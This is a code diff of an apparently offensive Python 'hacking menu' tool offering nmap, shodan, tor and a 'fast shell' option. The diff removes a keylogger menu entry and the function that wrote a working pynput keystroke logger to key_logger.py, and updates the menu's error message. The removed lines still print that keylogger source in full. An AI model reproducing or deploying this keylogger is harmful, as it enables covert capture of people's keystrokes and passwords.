@@ -55,7 +55,6 @@ def function_menu():
     print('[9]shodan')
     print('[10]nmap')
     print('[11]fast shell')
-    print('[12]keylogger')
     print('[0]exit')
 
     choice = input('Choose:')
@@ -84,14 +83,12 @@ def function_menu():
         print(nmap_menu())
     elif choice == 11:
         print(auto_shell)
-    elif choice == 12:
-        print(keylogger)
     elif choice == 0:
         os.system('sudo service tor stop')
         quit()
     else:
         os.system('clear')
-        print("You must only select from [1],[2],[3],[4],[5],[6],[7],[8],[9],[10],[0].")
+        print("You must only select from [1],[2],[3],[4],[5],[6],[7],[8],[9],[10],[11],[0].")
         print("Please try again!")
         function_menu()
         
@@ -856,25 +853,6 @@ def auto_shell():
         shellfile.write(endshell)
         shellfile.close()
         menu()
-def keylogger():
-    keylog = b'''
-    from pynput.keyboard import Key, Listener
-    import logging
-    import os
-    
-    os.system("pip install pynput logging")
-    log_dir = ""
-    logging.basicConfig(filename=(log_dir + "logs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
-                    
-    def on_press(key):
-       logging.info(str(key))
-
-    with Listener(on_press=on_press) as listener:
-       listener.join()'''
-    kl = open("key_logger.py", 'wb')
-    kl.write(keylog)
-    kl.close()
-    function_menu()
 function_menu()
 
 
